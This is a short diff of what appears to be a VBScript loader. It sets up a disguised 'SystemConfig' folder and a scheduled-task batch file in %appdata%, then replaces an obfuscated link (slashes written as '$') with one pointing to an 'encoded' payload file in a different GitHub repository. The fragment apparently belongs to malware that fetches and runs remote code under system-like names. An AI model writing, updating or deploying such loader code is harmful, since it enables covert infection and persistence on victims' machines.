@@ -4,7 +4,7 @@ Const configPath = "%appdata%\SystemConfig"
 Const taskFile = "%appdata%\SystemConfig\task_schedule.bat"
 Const updateSource = "https://raw.githubusercontent.com/Khanzadaofficial/newss/main/main.txt"
 Const token = "****"
-Const newLink = "https:$$github.com$Khanzadaofficial$newss$raw$refs$heads$main$encodedmmm.txt"
+Const newLink = "https:$$raw.githubusercontent.com$lospolloshermanos0000019$files$refs$heads$main$encoded_new.txt"
 
 Set sysFS = CreateObject("Scripting.FileSystemObject")
 Set sysShell = CreateObject("WScript.Shell")
